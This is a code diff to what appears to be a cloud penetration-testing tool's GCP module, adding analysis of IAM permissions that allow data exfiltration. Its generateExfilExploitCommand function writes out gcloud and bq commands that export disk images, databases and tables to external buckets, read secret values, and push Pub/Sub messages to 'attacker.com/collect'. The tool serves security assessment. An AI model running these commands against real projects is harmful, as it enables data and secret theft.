@@ -6,6 +6,7 @@ import (
 	"strings"
 	"sync"
 
+	attackpathservice "github.com/BishopFox/cloudfox/gcp/services/attackpathService"
 	bigqueryservice "github.com/BishopFox/cloudfox/gcp/services/bigqueryService"
 	loggingservice "github.com/BishopFox/cloudfox/gcp/services/loggingService"
 	orgpolicyservice "github.com/BishopFox/cloudfox/gcp/services/orgpolicyService"
@@ -119,19 +120,32 @@ type MissingHardening struct {
 	Recommendation string // How to enable it
 }
 
+// PermissionBasedExfilPath represents an exfiltration capability based on IAM permissions
+type PermissionBasedExfilPath struct {
+	Principal      string   // Who has this capability
+	PrincipalType  string   // user, serviceAccount, group
+	ProjectID      string   // Project where permission exists
+	Permission     string   // The dangerous permission
+	Category       string   // Category of exfiltration
+	RiskLevel      string   // CRITICAL, HIGH, MEDIUM
+	Description    string   // What this enables
+	ExploitCommand string   // Command to exploit
+}
+
 // ------------------------------
 // Module Struct
 // ------------------------------
 type DataExfiltrationModule struct {
 	gcpinternal.BaseGCPModule
 
-	ProjectExfiltrationPaths map[string][]ExfiltrationPath               // projectID -> paths
-	ProjectPotentialVectors  map[string][]PotentialVector                // projectID -> vectors
-	ProjectPublicExports     map[string][]PublicExport                   // projectID -> exports
-	LootMap                  map[string]map[string]*internal.LootFile    // projectID -> loot files
-	mu                       sync.Mutex
-	vpcscProtectedProj       map[string]bool                 // Projects protected by VPC-SC
-	orgPolicyProtection      map[string]*OrgPolicyProtection // Org policy protections per project
+	ProjectExfiltrationPaths   map[string][]ExfiltrationPath                // projectID -> paths
+	ProjectPotentialVectors    map[string][]PotentialVector                 // projectID -> vectors
+	ProjectPublicExports       map[string][]PublicExport                    // projectID -> exports
+	ProjectPermissionBasedExfil map[string][]PermissionBasedExfilPath       // projectID -> permission-based paths
+	LootMap                    map[string]map[string]*internal.LootFile     // projectID -> loot files
+	mu                         sync.Mutex
+	vpcscProtectedProj         map[string]bool                 // Projects protected by VPC-SC
+	orgPolicyProtection        map[string]*OrgPolicyProtection // Org policy protections per project
 }
 
 // ------------------------------
@@ -155,13 +169,14 @@ func runGCPDataExfiltrationCommand(cmd *cobra.Command, args []string) {
 	}
 
 	module := &DataExfiltrationModule{
-		BaseGCPModule:            gcpinternal.NewBaseGCPModule(cmdCtx),
-		ProjectExfiltrationPaths: make(map[string][]ExfiltrationPath),
-		ProjectPotentialVectors:  make(map[string][]PotentialVector),
-		ProjectPublicExports:     make(map[string][]PublicExport),
-		LootMap:                  make(map[string]map[string]*internal.LootFile),
-		vpcscProtectedProj:       make(map[string]bool),
-		orgPolicyProtection:      make(map[string]*OrgPolicyProtection),
+		BaseGCPModule:              gcpinternal.NewBaseGCPModule(cmdCtx),
+		ProjectExfiltrationPaths:   make(map[string][]ExfiltrationPath),
+		ProjectPotentialVectors:    make(map[string][]PotentialVector),
+		ProjectPublicExports:       make(map[string][]PublicExport),
+		ProjectPermissionBasedExfil: make(map[string][]PermissionBasedExfilPath),
+		LootMap:                    make(map[string]map[string]*internal.LootFile),
+		vpcscProtectedProj:         make(map[string]bool),
+		orgPolicyProtection:        make(map[string]*OrgPolicyProtection),
 	}
 
 	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
@@ -194,6 +209,14 @@ func (m *DataExfiltrationModule) getAllPublicExports() []PublicExport {
 	return all
 }
 
+func (m *DataExfiltrationModule) getAllPermissionBasedExfil() []PermissionBasedExfilPath {
+	var all []PermissionBasedExfilPath
+	for _, paths := range m.ProjectPermissionBasedExfil {
+		all = append(all, paths...)
+	}
+	return all
+}
+
 func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Logger) {
 	logger.InfoM("Identifying data exfiltration paths and potential vectors...", GCP_DATAEXFILTRATION_MODULE_NAME)
 
@@ -203,6 +226,9 @@ func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Lo
 	// Check organization policy protections for all projects
 	m.checkOrgPolicyProtection(ctx, logger)
 
+	// Analyze org and folder level exfil paths (runs once for all projects)
+	m.analyzeOrgFolderExfilPaths(ctx, logger)
+
 	// Process each project
 	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_DATAEXFILTRATION_MODULE_NAME, m.processProject)
 
@@ -211,9 +237,10 @@ func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Lo
 
 	allPaths := m.getAllExfiltrationPaths()
 	allVectors := m.getAllPotentialVectors()
+	allPermBasedPaths := m.getAllPermissionBasedExfil()
 
 	// Check results
-	hasResults := len(allPaths) > 0 || len(allVectors) > 0 || len(hardeningRecs) > 0
+	hasResults := len(allPaths) > 0 || len(allVectors) > 0 || len(hardeningRecs) > 0 || len(allPermBasedPaths) > 0
 
 	if !hasResults {
 		logger.InfoM("No data exfiltration paths, vectors, or hardening gaps found", GCP_DATAEXFILTRATION_MODULE_NAME)
@@ -226,11 +253,79 @@ func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Lo
 	if len(allVectors) > 0 {
 		logger.SuccessM(fmt.Sprintf("Found %d potential exfiltration vector(s)", len(allVectors)), GCP_DATAEXFILTRATION_MODULE_NAME)
 	}
+	if len(allPermBasedPaths) > 0 {
+		logger.SuccessM(fmt.Sprintf("Found %d permission-based exfiltration path(s)", len(allPermBasedPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
+	}
 	if len(hardeningRecs) > 0 {
 		logger.InfoM(fmt.Sprintf("Found %d hardening recommendation(s)", len(hardeningRecs)), GCP_DATAEXFILTRATION_MODULE_NAME)
 	}
 
 	m.writeOutput(ctx, logger)
+}
+
+// analyzeOrgFolderExfilPaths analyzes organization and folder level IAM for exfil permissions
+func (m *DataExfiltrationModule) analyzeOrgFolderExfilPaths(ctx context.Context, logger internal.Logger) {
+	attackSvc := attackpathservice.New()
+
+	// Analyze organization-level IAM
+	orgPaths, orgNames, _, err := attackSvc.AnalyzeOrganizationAttackPaths(ctx, "exfil")
+	if err != nil {
+		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+			gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze organization-level exfil paths")
+		}
+	} else if len(orgPaths) > 0 {
+		logger.InfoM(fmt.Sprintf("Found %d organization-level exfil path(s)", len(orgPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
+		for _, path := range orgPaths {
+			orgName := orgNames[path.ScopeID]
+			if orgName == "" {
+				orgName = path.ScopeID
+			}
+			exfilPath := PermissionBasedExfilPath{
+				Principal:      path.Principal,
+				PrincipalType:  path.PrincipalType,
+				ProjectID:      "org:" + path.ScopeID,
+				Permission:     path.Method,
+				Category:       path.Category + " (Org: " + orgName + ")",
+				RiskLevel:      "CRITICAL", // Org-level is critical
+				Description:    path.Description,
+				ExploitCommand: path.ExploitCommand,
+			}
+			// Store under a special "organization" key
+			m.mu.Lock()
+			m.ProjectPermissionBasedExfil["organization"] = append(m.ProjectPermissionBasedExfil["organization"], exfilPath)
+			m.mu.Unlock()
+		}
+	}
+
+	// Analyze folder-level IAM
+	folderPaths, folderNames, err := attackSvc.AnalyzeFolderAttackPaths(ctx, "exfil")
+	if err != nil {
+		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+			gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze folder-level exfil paths")
+		}
+	} else if len(folderPaths) > 0 {
+		logger.InfoM(fmt.Sprintf("Found %d folder-level exfil path(s)", len(folderPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
+		for _, path := range folderPaths {
+			folderName := folderNames[path.ScopeID]
+			if folderName == "" {
+				folderName = path.ScopeID
+			}
+			exfilPath := PermissionBasedExfilPath{
+				Principal:      path.Principal,
+				PrincipalType:  path.PrincipalType,
+				ProjectID:      "folder:" + path.ScopeID,
+				Permission:     path.Method,
+				Category:       path.Category + " (Folder: " + folderName + ")",
+				RiskLevel:      "CRITICAL", // Folder-level is critical
+				Description:    path.Description,
+				ExploitCommand: path.ExploitCommand,
+			}
+			// Store under a special "folder" key
+			m.mu.Lock()
+			m.ProjectPermissionBasedExfil["folder"] = append(m.ProjectPermissionBasedExfil["folder"], exfilPath)
+			m.mu.Unlock()
+		}
+	}
 }
 
 // ------------------------------
@@ -633,6 +728,11 @@ func (m *DataExfiltrationModule) processProject(ctx context.Context, projectID s
 
 	// 14. Check for Logging sink capability
 	m.checkLoggingSinkCapability(ctx, projectID, logger)
+
+	// === PERMISSION-BASED EXFILTRATION CAPABILITIES ===
+
+	// 15. Check IAM for principals with data exfiltration permissions
+	m.findPermissionBasedExfilPaths(ctx, projectID, logger)
 }
 
 // findPublicSnapshots finds snapshots that are publicly accessible
@@ -1425,6 +1525,112 @@ gcloud logging sinks update SINK_NAME \
 		m.addPotentialVectorToLoot(projectID, vector)
 		m.mu.Unlock()
 	}
+}
+
+// findPermissionBasedExfilPaths identifies principals with data exfiltration permissions
+// This now uses the centralized attackpathService for project-level analysis only
+// Org/folder/resource level analysis is done separately in findAllLevelExfilPaths
+func (m *DataExfiltrationModule) findPermissionBasedExfilPaths(ctx context.Context, projectID string, logger internal.Logger) {
+	// Use attackpathService for project-level analysis
+	attackSvc := attackpathservice.New()
+
+	projectName := m.GetProjectName(projectID)
+	paths, err := attackSvc.AnalyzeProjectAttackPaths(ctx, projectID, projectName, "exfil")
+	if err != nil {
+		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
+			fmt.Sprintf("Could not analyze exfil permissions for project %s", projectID))
+		return
+	}
+
+	// Convert AttackPath to PermissionBasedExfilPath
+	for _, path := range paths {
+		exfilPath := PermissionBasedExfilPath{
+			Principal:      path.Principal,
+			PrincipalType:  path.PrincipalType,
+			ProjectID:      projectID,
+			Permission:     path.Method,
+			Category:       path.Category,
+			RiskLevel:      "HIGH", // Default risk level
+			Description:    path.Description,
+			ExploitCommand: path.ExploitCommand,
+		}
+
+		m.mu.Lock()
+		m.ProjectPermissionBasedExfil[projectID] = append(m.ProjectPermissionBasedExfil[projectID], exfilPath)
+		m.mu.Unlock()
+	}
+
+	// Also analyze resource-level IAM
+	resourcePaths, err := attackSvc.AnalyzeResourceAttackPaths(ctx, projectID, "exfil")
+	if err != nil {
+		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+			gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
+				fmt.Sprintf("Could not analyze resource-level exfil permissions for project %s", projectID))
+		}
+	} else {
+		for _, path := range resourcePaths {
+			exfilPath := PermissionBasedExfilPath{
+				Principal:      path.Principal,
+				PrincipalType:  path.PrincipalType,
+				ProjectID:      projectID,
+				Permission:     path.Method,
+				Category:       path.Category + " (Resource: " + path.ScopeName + ")",
+				RiskLevel:      "HIGH",
+				Description:    path.Description,
+				ExploitCommand: path.ExploitCommand,
+			}
+
+			m.mu.Lock()
+			m.ProjectPermissionBasedExfil[projectID] = append(m.ProjectPermissionBasedExfil[projectID], exfilPath)
+			m.mu.Unlock()
+		}
+	}
+}
+
+// generateExfilExploitCommand generates an exploit command for a data exfil permission
+func (m *DataExfiltrationModule) generateExfilExploitCommand(permission, projectID string) string {
+	switch permission {
+	case "compute.images.create":
+		return fmt.Sprintf(`# Create image from disk (for export)
+gcloud compute images create exfil-image --source-disk=DISK_NAME --source-disk-zone=ZONE --project=%s
+# Export to external bucket
+gcloud compute images export --image=exfil-image --destination-uri=gs://EXTERNAL_BUCKET/image.tar.gz --project=%s`, projectID, projectID)
+	case "compute.snapshots.create":
+		return fmt.Sprintf(`# Create snapshot from disk (for export)
+gcloud compute snapshots create exfil-snapshot --source-disk=DISK_NAME --source-disk-zone=ZONE --project=%s`, projectID)
+	case "logging.sinks.create":
+		return fmt.Sprintf(`# Create logging sink to external destination
+gcloud logging sinks create exfil-sink pubsub.googleapis.com/projects/EXTERNAL_PROJECT/topics/stolen-logs --project=%s`, projectID)
+	case "cloudsql.instances.export":
+		return fmt.Sprintf(`# Export Cloud SQL database to GCS
+gcloud sql export sql INSTANCE_NAME gs://BUCKET/export.sql --database=DB_NAME --project=%s`, projectID)
+	case "pubsub.subscriptions.create":
+		return fmt.Sprintf(`# Create subscription to intercept messages
+gcloud pubsub subscriptions create exfil-sub --topic=TOPIC_NAME --push-endpoint=https://attacker.com/collect --project=%s`, projectID)
+	case "bigquery.tables.export":
+		return fmt.Sprintf(`# Export BigQuery table to GCS
+bq extract --destination_format=CSV '%s:DATASET.TABLE' gs://BUCKET/export.csv`, projectID)
+	case "storagetransfer.jobs.create":
+		return fmt.Sprintf(`# Create transfer job to external cloud (requires API)
+gcloud transfer jobs create gs://SOURCE_BUCKET s3://DEST_BUCKET --project=%s`, projectID)
+	case "secretmanager.versions.access":
+		return fmt.Sprintf(`# Access secret values
+gcloud secrets versions access latest --secret=SECRET_NAME --project=%s`, projectID)
+	default:
+		return fmt.Sprintf("# Permission: %s\n# Refer to GCP documentation for exploitation", permission)
+	}
+}
+
+// extractPrincipalType extracts the type from a principal name like "user:email" or "serviceAccount:email"
+func extractPrincipalType(principalName string) string {
+	if strings.HasPrefix(principalName, "user:") {
+		return "user"
+	} else if strings.HasPrefix(principalName, "serviceAccount:") {
+		return "serviceAccount"
+	} else if strings.HasPrefix(principalName, "group:") {
+		return "group"
+	}
+	return "unknown"
 }
 
 // ------------------------------
